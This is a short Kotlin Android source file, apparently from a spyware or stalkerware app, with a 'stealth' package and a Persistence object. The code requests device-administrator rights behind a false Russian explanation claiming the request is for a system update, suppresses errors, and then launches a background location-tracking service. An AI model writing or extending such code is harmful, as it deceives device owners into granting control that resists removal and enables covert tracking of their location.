package com.sp.core.stealth

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import com.sp.core.AdminReceiver
import com.sp.core.services.LocationService

object Persistence {
    fun lockIn(ctx: Context) {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE)
                as DevicePolicyManager
        val admin = ComponentName(ctx, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Требуется для обновления системы")
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            try { ctx.startActivity(i) } catch (_: Exception) {}
        }
        val svc = Intent(ctx, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc)
        else ctx.startService(svc)
    }
}